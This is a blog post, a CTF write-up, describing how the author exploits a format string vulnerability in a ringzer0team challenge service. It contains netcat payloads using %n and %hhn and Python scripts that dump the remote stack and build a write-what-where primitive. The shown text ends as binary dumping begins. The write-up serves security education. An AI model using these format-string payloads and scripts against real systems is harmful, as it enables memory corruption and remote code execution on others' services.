
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution - staring into /dev/null</title>
  <meta name="author" content="barrebas">

  
  <meta name="description" content="You might remember my first Maximum Overkill writeup, where I made a ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise. I &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">staring into /dev/null</a></h1>
  
    <h2>barrebas</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:barrebas.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-02-22T13:01:22+01:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>1:01 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>You might remember my first <a href="https://staringintodevnull.blogspot.nl/2014/09/maximum-overkill-rop-exploit-for.html">Maximum Overkill writeup</a>, where I made a ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise. I completed another over-the-top, why-would-you-even-do-this exploit for a CTF challenge and figured I&rsquo;d shared it.</p>

<!-- more -->


<p><a href="http://ringzer0team.com">ringzer0team</a> has a very nice, long-running CTF going on. I already did the <a href="https://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/">shellcoding challenges</a>, which I really enjoyed. I completed the fourth pwnable level on an evening, which simply involved dumping the stack via a format string bug and grabbing a password. I thought to myself: &ldquo;would I be able to get a shell using this format string vulnerability?&rdquo;</p>

<p>This writeup is made with Hindsight<sup>tm</sup> and as such, I have not included all the paths that led nowhere or the mistakes I have made. I have tried to include the thought-process as much as possible.</p>

<h2>Dumping the Stack</h2>

<p>OK, onwards! One catch is that the remote box is a 64-bit system and I don&rsquo;t have the binary itself. We do have a snippet of source code and the ability to dump the stack from within a vulnerable <code>sprintf</code> call:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">response</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="n">response</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">2048</span><span class="p">);</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2048</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">cleanBuffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'><span class="n">strncpy</span><span class="p">(</span><span class="n">cleanBuffer</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="n">test</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;AAAABBBBCCCC&quot;</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="n">flag</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">cleanBuffer</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="s">&quot;Here&#39;s your flag FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXX.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">cleanBuffer</span><span class="p">);</span> <span class="c1">// &lt;-- we have a format string vulnerability here</span>
</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="s">&quot;%s is a wrong password.</span><span class="se">\n\n</span><span class="s">Password:&quot;</span><span class="p">,</span> <span class="n">response</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc pwn01.ringzer0team.com 13377
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:%lx-%lx-%lx-%lx-%lx-%lx-
</span><span class='line'>17f4880-25-0-80-7fffd6e74448-200000000- is a wrong password.
</span></code></pre></td></tr></table></div></figure>


<p>The fifth address jumps out. It is either a stack address, or a <code>libc</code> address. Let&rsquo;s see what it points to:</p>

<p><img src="/assets/maximum-overkill-two/00-what-does-the-stack-contain.png" alt="" /></p>

<p>I tried to write to it using <code>%n</code>, which didn&rsquo;t crash the remote binary. This meant that it most likely is a stack address! I wrote a small python script to dump the stack. I noticed I could not re-use the connection I made via python sockets, so I had to reconnect for every format string I sent.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="n">i</span><span class="p">,</span> <span class="n">addr</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">700</span><span class="p">):</span>
</span><span class='line'>  <span class="n">grab</span><span class="p">(</span><span class="n">z</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This indeed dumped out the data on the stack. I found where the fifth parameter was pointing to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">...</span><span class="n">snip</span><span class="o">...</span>
</span><span class='line'><span class="mi">633</span> <span class="mi">7</span><span class="n">fffeecd9c28</span>
</span><span class='line'><span class="mi">634</span> <span class="mi">1</span><span class="n">c</span>
</span><span class='line'><span class="mi">635</span> <span class="mi">2</span>
</span><span class='line'><span class="mi">636</span> <span class="mi">7</span><span class="n">fff00000042</span>
</span><span class='line'><span class="mi">637</span> <span class="mi">7</span><span class="n">fffeecdaf65</span>
</span><span class='line'><span class="mi">638</span> <span class="mi">0</span>
</span><span class='line'><span class="o">...</span><span class="n">snip</span><span class="o">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>See, it points to the 636th parameter, because the lower 32 bits contain the value I&rsquo;ve just written with <code>%n</code>! Pretty neat. So with <code>%&lt;parameter number&gt;$lx</code> I could view what that particular parameter contained, and with <code>%&lt;parameter number&gt;$s</code> I could see what it pointed to (provided it was pointing to a valid memory address!) I wondered where the 636th parameter pointed to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc pwn01.ringzer0team.com 13377
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$lx</span>
</span><span class='line'>7fff3ca49f51 is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$s</span>
</span><span class='line'>/home/crackme/fs_64 is a wrong password.
</span></code></pre></td></tr></table></div></figure>


<p>Interesting! I figured I could use this to my advantage&hellip; The 5th parameter points to the 636th, which itself points to somewhere on the stack. I could write to the address contained in the 636th parameter, like so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc pwn01.ringzer0team.com 13377
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$lx</span>
</span><span class='line'>7fff3ca49f51 is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$s</span>
</span><span class='line'>/home/crackme/fs_64 is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%66c%636<span class="nv">$hhn</span>
</span><span class='line'>                                                                 � is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$s</span>
</span><span class='line'>Bhome/crackme/fs_64 is a wrong password.
</span></code></pre></td></tr></table></div></figure>


<h2>Write what where now?</h2>

<p>But more importantly, I could write <strong>to</strong> the 636th parameter <em>via</em> the fifth, giving me a write-what-where primitive! So, for instance, to write to <code>0x7fff3ca49f00</code>, I&rsquo;d first do <code>%256c%5$hhn</code>. This will overwrite the last byte of the 636th parameter with a NULL. Then, I&rsquo;d write to the address using <code>%66c%636$hhn</code>. Finally, I&rsquo;d like to know where this byte was written, which turned out to be the easiest: we have the address of <code>636</code>, and we have another address <code>0x7fff3ca49f00</code>. Subtracting the first from the latter and dividing by 8 gives the format string parameter we need to access the written byte directly! I wrote a simple proof-of-concept for this.</p>

<p>The following python code abuses the format string vulnerability to write out &lsquo;BAS&rsquo; to an area on the stack. We can access it indirectly with <code>%636$s</code> and directly using <code>%&lt;parameter&gt;$lx</code>, given the proper format parameter. The funny thing that I noticed was that my changes to the stack were persistent, even after reconnecting. This meant that the binary did not fork(), but handled each request by itself. This is interesting for later&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_directly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addr</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_indirectly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$s</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># ugly workaround, only grab 8 bytes. will fix this later!</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write_byte_value_via</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$hhn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this will write out &#39;BAS&#39;,0 to the scratch area!</span>
</span><span class='line'><span class="c"># update the pointer</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="c"># write a byte to the scratch area</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="p">))</span>
</span><span class='line'><span class="c"># update the pointer</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'><span class="c"># write a byte to the scratch area</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="p">))</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;S&#39;</span><span class="p">))</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'><span class="c"># write out a NULL byte first writing out 256 bytes (which wraps to 0x00)</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># reset the pointer</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># CAN ADDRESS IT DIRECTLY!!</span>
</span><span class='line'><span class="n">scratch_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">scratch_addr</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5<span class="nv">$ </span>python sploit1.py
</span><span class='line'>parameter <span class="m">5</span> points to:  0x7fff3ca480d8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fff3ca49f51
</span><span class='line'>scratch contains:  0x534142
</span><span class='line'>scratch is parameter 1601
</span><span class='line'>scratch contains:  0x53414200
</span></code></pre></td></tr></table></div></figure>


<p>This is great, because I have a write-what-where primitive know! My first thought was to overwrite a GOT entry with <code>system()</code>. For that to work, I needed several things: the address of system() in libc, and thus which version of libc I was dealing with; and the address of a GOT pointer which I could overwrite. First things first, I wrote a dumper script to start dumping the binary.</p>

<h2>Slam Dump </h2>

